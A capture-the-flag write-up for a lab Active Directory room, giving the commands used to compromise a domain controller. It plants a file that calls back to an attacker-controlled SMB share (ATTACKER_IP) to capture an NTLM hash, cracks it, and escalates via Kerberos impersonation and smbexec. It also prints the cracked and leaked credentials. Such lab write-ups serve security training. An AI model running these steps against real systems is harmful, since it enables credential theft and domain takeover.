# [Proxy](https://tryhackme.com/room/proxychallenge)

## Use your AD knowledge to exploit a careless service account and own the Domain Controller.

Every request has to go through someone... but what if that someone is you? Route your way through an Active Directory environment, intercept what you shouldn't, and pull the strings from behind the proxy. Nothing gets through without your say.

### What's the Administrator flag?

_check the Desktop_

1. Initial full port scan:

```bash
nmap -p- <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
7680/tcp  open  pando-pub
9389/tcp  open  adws
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49694/tcp open  unknown
```

2. Service/version enumeration:

```bash
nmap -sVC -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,7680,9389,49670,49671,49672,49694 <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-08 16:48:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-08T16:49:59+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.ctf.local
| Not valid before: 2026-05-19T02:27:27
|_Not valid after:  2026-11-18T02:27:27
| rdp-ntlm-info:
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-08T16:49:19+00:00
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

3. Add the host entry so AD name resolution works:

```bash
echo "<TARGET_IP> ctf.local DC01.ctf.local" >> /etc/hosts
```

4. Enumerate SMB shares anonymously:

```bash
smbclient -L //<TARGET_IP> -N
```

**Results:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
IT-Shared       Disk      IT Department Shared Resources
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

5. Access IT-Shared and download the files:

```bash
smbclient //<TARGET_IP>/IT-Shared -N
prompt off
mget *
```

**IT-Credentials-Backup.txt**

```
IT Department - Credentials Backup
===================================
Generated: 2019-08-14
Status: ARCHIVED (accounts disabled pending security review)

  helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
  it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]

NOTE: These accounts have been disabled. Active service accounts
      are managed separately by the sysadmin team.
```

> `IT-Credentials-Backup.txt` shows only disabled user credentials, so those are useless for direct login.

**IT-Onboarding-Checklist.txt**

```
IT Department Onboarding Checklist
====================================
Welcome to the team!

1. Get VPN access from sysadmin
2. Request AD account
3. Install tools (see software list on intranet)
4. Review security policies

Automated Services
------------------
  File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.

  Database Backup (svc.mssql)
    Handles nightly MSSQL backups. Member of Backup Operators.
    Password rotated quarterly -- do not store locally.

Questions? Email helpdesk@ctf.local
```

> `IT-Onboarding-Checklist.txt` reveals the important service account and how the file scanner works:

- Service: `File Scanner (svc.scanner)`
- Runs every 2 minutes
- Enumerates `IT-Shared` for new files
- Uses Shell enumeration to inspect file metadata and icons

6. Start an SMB server on our attack machine to capture authentication:

```bash
python3 smbserver.py -smb2support MYSMB $(pwd) -debug
```

7. Create a file that will force the scanner to resolve a remote icon path. For example, this can be a file that references:

```ps1
Test-Path \\<ATTACKER_IP>\icons\icon.ico
```

8. Upload the malicious file into `IT-Shared`:

```bash
put test.ps1
```

> Now wait for the file scanner to process the file and authenticate to our SMB server. The SMB server should capture the NTLM hash from the incoming authentication.

9. Save the captured hash to a file and crack it:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

10. Run BloodHound to analyze the domain and determine how `svc.scanner` can reach Administrator:

```bash
bloodhound-ce-python --zip -c All -d ctf.local -u 'svc.scanner' -p '1summerlove!' -dc DC01.ctf.local -ns <TARGET_IP>
```

11. Use Impacket to request a service ticket for Administrator:

```bash
getST.py ctf.local/svc.scanner:'1summerlove!' -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip DC01.ctf.local
```

12. Point `KRB5CCNAME` at the generated ticket cache:

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

13. Use `smbexec.py` with Kerberos authentication:

```bash
smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

14. Read the Administrator flag:

```bash
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\flag.txt
```

[SCREEN01]
